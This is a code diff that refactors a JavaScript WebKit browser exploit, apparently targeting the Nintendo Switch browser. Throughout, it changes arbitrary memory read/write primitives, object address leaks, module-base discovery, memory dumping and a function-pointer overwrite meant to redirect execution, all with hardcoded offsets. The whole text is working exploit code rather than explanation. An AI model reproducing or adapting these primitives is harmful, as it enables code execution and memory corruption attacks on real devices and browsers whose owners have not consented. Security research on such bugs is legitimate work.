@@ -83,7 +83,7 @@ function doExploit(buf, stale, temp) {
 
 	var func = document.getElementById;
 	func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
-	var funclo, funchi;
+	var funcaddr;
 	var funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module
 
 	var leakee = {'b' : null};
@@ -93,222 +93,147 @@ function doExploit(buf, stale, temp) {
 	stale[1] = leaker;
 	var leaklo = buf[4], leakhi = buf[5];
 	stale[1] = temp;
+	var leakaddr = [leaklo, leakhi];
 
-	function read4(lo, hi, off) {
-		if(arguments.length == 2) {
-			off = hi;
-			hi = lo[1];
-			lo = lo[0];
+	function nullptr(addr) {
+		return addr[0] == 0 && addr[1] == 0;
+	}
+	function add2(addr, off) {
+		if(typeof(off) == 'number')
+			off = [off, 0];
+
+		var alo = addr[0], ahi = addr[1];
+		var blo = off[0], bhi = off[1];
+
+		var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
+		var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;
+
+		if((nlo < alo && blo > 0) || (nlo == alo && blo != 0)) {
+			nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
+		} else if(nlo > alo && blo < 0) {
+			nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
 		}
-		buf[4] = lo;
-		buf[5] = hi;
+
+		return [nlo, nhi];
+	}
+	function offset32(addr, off) {
+		return add(addr, off * 4);
+	}
+	function read4(addr, offset) {
+		if(arguments.length == 1)
+			offset = 0;
+		buf[4] = addr[0];
+		buf[5] = addr[1];
 		buf[6] = 0xFFFFFFFF;
 
-		return temp[off];
+		return temp[offset];
 	}
-	function readAddr(lo, hi, off) {
-		if(arguments.length == 2) {
-			off = hi;
-			hi = lo[1];
-			lo = lo[0];
-		}
-		return [read4(lo, hi, off), read4(lo, hi, off + 1)];
+	function write4(val, addr, offset) {
+		if(arguments.length == 2)
+			offset = 0;
+		buf[4] = addr[0];
+		buf[5] = addr[1];
+		buf[6] = 0xFFFFFFFF;
+
+		temp[offset] = val;
+	}
+	function read8(addr, offset) {
+		if(arguments.length == 1)
+			offset = 0;
+		return [read4(addr, offset), read4(addr, offset + 1)];
+	}
+	function write8(val, addr, offset) {
+		if(arguments.length == 2)
+			offset = 0;
+		write4(val[0], addr, offset);
+		write4(val[1], addr, offset + 1);
 	}
 	function getAddr(obj) {
 		leakee['b'] = obj;
-		return [read4(leaklo, leakhi, 4), read4(leaklo, leakhi, 5)];
+		return read8(leakaddr, 4);
 	}
 
 	function getBase() {
 		var tlfuncaddr = getAddr(func);
-		var funcaddr = readAddr(tlfuncaddr, 6);
-		funclo = funcaddr[0];
-		funchi = funcaddr[1];
+		funcaddr = read8(tlfuncaddr, 6);
 
-		var lo = (((read4(funcaddr, 8) - funcbase) >>> 0) & 0xFFFFFFFF) >>> 0;
-		if(read4(funcaddr, 8) < funcbase)
-			hi = (read4(funcaddr, 9) - 1) >>> 0;
-		else
-			hi = read4(funcaddr, 9) >>> 0;
+		var baseaddr = add2(read8(funcaddr, 8), -funcbase);
 
-		log('First module ... ' + paddr(lo, hi));
+		log('First module ... ' + paddr(baseaddr));
 
-		return [lo, hi];
+		return baseaddr;
 	}
 
 	function dumpNRO() {
 		var addr = getBase();
-		var lo = addr[0], hi = addr[1];
-		log('Reading from 0x' + hi.toString(16) + ' : 0x' + lo.toString(16));
+		log('Reading from ' + paddr(addr));
 
-		buf[4] = (lo + readoff) >>> 0;
-		buf[5] = hi;
+		addr = add2(addr, readoff);
+		buf[4] = addr[0];
+		buf[5] = addr[1];
 		buf[6] = 0xFFFFFFFF;
 
-		memdump(lo, hi, temp, readsize >> 2);
-	}
-
-	function findExtents(addrOffset, direction) {
-		var addr = getBase();
-		var lo = addr[0], hi = addr[1];
-		
-		lo = ((lo + addrOffset) >>> 0);
-
-		buf[4] = lo;
-		buf[5] = hi;
-		lo = temp[0];
-		hi = temp[1];
-
-		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;
-
-		lo = (lo - (87 * 4096) + 0x57B00) >>> 0;
-
-		buf[4] = lo;
-		buf[5] = hi;
-		lo = temp[0];
-		hi = temp[1];
-
-		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;
-
-		lo = (lo - (109 * 4096) + 0x6D860) >>> 0;
-
-		buf[4] = lo;
-		buf[5] = hi;
-		lo = temp[0];
-		hi = temp[1];
-
-		lo = ((lo >>> 0) & 0xFFFFF000) >>> 0;
-
-		lo = (lo - (1890 * 4096) + readoff) >>> 0;
-
-		buf[4] = lo;
-		buf[5] = hi;
-		buf[6] = 0xFFFFFFFF;
-		memdump(lo, hi, temp, readsize >> 2);
-		return;
-
-		var numpages = 0;
-
-		while(true) {
-			buf[4] = lo;
-			buf[5] = hi;
-
-			log('Page ' + (direction == -1 ? '-' : '+') + numpages + ' (0x' + lo.toString(16) + '): ' + temp[0]);
-			for(var i = 0; i < 10; ++i)
-				log('~~buffer~~');
-
-			numpages++;
-			if(direction == -1) {
-				var t = lo;
-				lo = (((lo - 0x1000) >>> 0) & 0xFFFFFFFF) >>> 0;
-				if(lo > t)
-					hi -= 1;
-			} else {
-				var t = lo;
-				lo = (((lo + 0x1000) >>> 0) & 0xFFFFFFFF) >>> 0;
-				if(lo < t)
-					hi += 1;
-			}
-		}
+		memdump(addr[0], addr[1], temp, readsize >> 2);
 	}
 
 	function walkList() {
 		var addr = getBase();
-		var lo = addr[0], hi = addr[1];
-		log('Initial NRO at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
+		log('Initial NRO at ' + paddr(addr));
 
 		while(true) {
-			var blo = lo;
-			var bhi = hi;
+			var baddr = addr;
 
-			buf[4] = blo;
-			buf[5] = bhi;
-			buf[6] = 0xFFFFFFFF;
-			var modoff = temp[1];
-			lo = (blo + modoff) >>> 0;
-			buf[4] = lo;
-			var modstr = temp[0x18 >> 2];
-			lo = (lo + modstr) >>> 0;
-			buf[4] = lo;
+			var modoff = read4(addr, 1);
+			addr = add2(addr, modoff);
+			var modstr = read4(addr, 6);
+			addr = add2(addr, modstr);
 
 			// Read next link ptr
-			lo = temp[0];
-			hi = temp[1];
-			if(lo == 0 && hi == 0) {
+			addr = read8(addr);
+			if(nullptr(addr)) {
 				log('Reached end');
 				break;
 			}
 
-			buf[4] = lo;
-			buf[5] = hi;
+			var nro = read8(addr, 8);
 
-			var nrolo = temp[8], nrohi = temp[9];
-
-			if(nrolo == 0 && nrohi == 0) {
-				log('Hit RTLD at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
-				lo = temp[4];
-				hi = temp[5];
+			if(nullptr(nro)) {
+				log('Hit RTLD at ' + paddr(addr));
+				addr = read8(addr, 4);
 				break;
 			}
-			buf[4] = nrolo;
-			buf[5] = nrohi;
 
-			if(temp[4] != 0x304f524e) {
+			buf[4] = nro[0];
+			buf[5] = nro[1];
+			if(read4(nro, 4) != 0x304f524e) {
 				log('Something is wrong.  No NRO header at base.');
-				//memdump(nrolo, nrohi, temp, (4096 * 3) >> 2);
 				break;
 			}
 
-			lo = nrolo;
-			hi = nrohi;
-			log('Found NRO at 0x' + hi.toString(16) + ':0x' + lo.toString(16));
+			addr = nro;
+			log('Found NRO at ' + paddr(nro));
 		}
 
-		var ctr = 0;
-
 		while(true) {
-			//log('xxx ptr lo: ' + lo.toString(16));
-			//log('xxx ptr hi: ' + hi.toString(16));
-			buf[4] = lo;
-			buf[5] = hi;
-
-			nrolo = temp[8];
-			nrohi = temp[9];
-			//log('nro base lo: ' + nrolo.toString(16));
-			//log('nro base hi: ' + nrohi.toString(16));
-			if(nrolo == 0 && nrohi == 0) {
+			var nro = read8(addr, 8);
+			if(nro[0] == 0 && nro[1] == 0) {
 				log('Hm, hit the end of things.  Back in rtld?');
 				return;
 			}
 
-			buf[4] = nrolo;
-			buf[5] = nrohi;
-			
-			if(temp[temp[1] >> 2] == 0x30444f4d) {
-				log('Got MOD at 0x' + nrohi.toString(16) + ':0x' + nrolo.toString(16));
-				if(temp[4] == 0x8DCDF8 && temp[5] == 0x959620) {
+			if(read4(nro, read4(nro, 1) >> 2) == 0x30444f4d) {
+				log('Got MOD at ' + paddr(nro));
+				if(read4(nro, 4) == 0x8DCDF8 && read4(nro, 5) == 0x959620) {
 					log('Found main module.');
-					return [nrolo, nrohi];
+					return nro;
 				}
-				/*if(++ctr == 2)
-					while(true) {
-						log('Attempting write of page...');
-						memdump(nrolo, nrohi, temp, 4096 >> 2);
-						nrolo = (nrolo + 4096) >>> 0;
-						buf[4] = nrolo;
-					}*/
 			} else {
 				log('No valid MOD header.  Back at RTLD.');
 				break;
 			}
 
-			buf[4] = lo;
-			buf[5] = hi;
-			lo = temp[0];
-			hi = temp[1];
-			//log('new ptr lo: ' + lo.toString(16));
-			//log('new ptr hi: ' + hi.toString(16));
-			if(lo == 0 && hi == 0) {
+			addr = read8(addr, 0);
+			if(nullptr(addr)) {
 				log('End of chain.');
 				break;
 			}
@@ -317,48 +242,24 @@ function doExploit(buf, stale, temp) {
 
 	function setjmp() {
 		var mainaddr = walkList();
-		var nlo = mainaddr[0], nhi = mainaddr[1];
-		log('Main module at ' + paddr(nlo, nhi));
+		log('Main module at ' + paddr(mainaddr));
 		var justret = 0x00433F78;
 		var setjmp  = 0x00433EE0;
 		var test = 0x0439DD8;
-		nlo = (((nlo + test) >>> 0) & 0xFFFFFFFF) >>> 0;
-		if(nlo < mainaddr[0])
-			nhi = (nhi + 1) >>> 0;
-		log('setjmp at ' + paddr(nlo, nhi));
+		var jaddr = add2(mainaddr, test);
+		log('New jump at ' + paddr(jaddr));
 		log('Assigning function pointer');
 
-		var lo = funclo;
-		var hi = funchi;
-		log('Function object at ' + paddr(lo, hi));
-		buf[4] = lo;
-		buf[5] = hi;
-		buf[6] = 128;
+		log('Function object at ' + paddr(funcaddr));
+		var curptr = read8(funcaddr, 8);
 
-		lo = temp[8];
-		hi = temp[9];
+		// For addresses in webkit_wkc
+		write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);
 
-		temp[8] = (lo + (0x836050 - funcbase)) >>> 0;
-
-		var xlo = temp[8], xhi = temp[9];
-		log(paddr(xlo, xhi));
-		var t = {'a' : {}};
-		var taddr = getAddr(t);
-		log(paddr(taddr));
-		buf[4] = taddr[0];
-		buf[5] = taddr[1];
-		temp[0] = xlo;
-		temp[1] = xhi;
-		log('...');
-		var tobj = t['a'];
-		log('...');
-		//log(tobj);
-		log(paddr(readAddr(getAddr(tobj), 0)));
-		return;
-
-		//temp[8] = nlo;
-		//temp[9] = nhi;
-		//log('Patched function address from ' + paddr(lo, hi) + ' to ' + paddr(temp[8], temp[9]));
+		// For addresses in app
+		//write8(jaddr, funcaddr, 8);
+		
+		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
 
 		log('Assigned.  Jumping.');
 		alert('Trying to setjmp...');
